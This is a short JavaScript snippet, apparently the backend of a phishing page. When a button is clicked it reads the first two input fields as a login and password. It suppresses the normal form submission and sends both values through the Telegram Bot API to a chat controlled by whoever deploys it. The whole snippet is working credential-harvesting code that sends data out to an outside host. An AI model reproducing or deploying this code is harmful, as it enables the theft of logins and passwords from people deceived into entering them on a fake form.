let bot_token = 'Your bot token' 
let bot_api = 'https://api.telegram.org/bot' + bot_token + '/sendMessage' 
let chat_id = 'your chat id ' 


let inputs = document.querySelectorAll('input') 
let button = document.querySelector('button') 
 
button.addEventListener('click', (event) => { 
    event.preventDefault()
 
    let text = ` \n login:  ${inputs[0].value} \n password:  ${inputs[1].value} `
 
    fetch(bot_api, { 
        method: "POST", 
        headers: { 
            'Content-Type': 'application/json' 
        }, 
        body: JSON.stringify({ 
            chat_id: chat_id, 
            text: text 
        }) 
    }) 
})
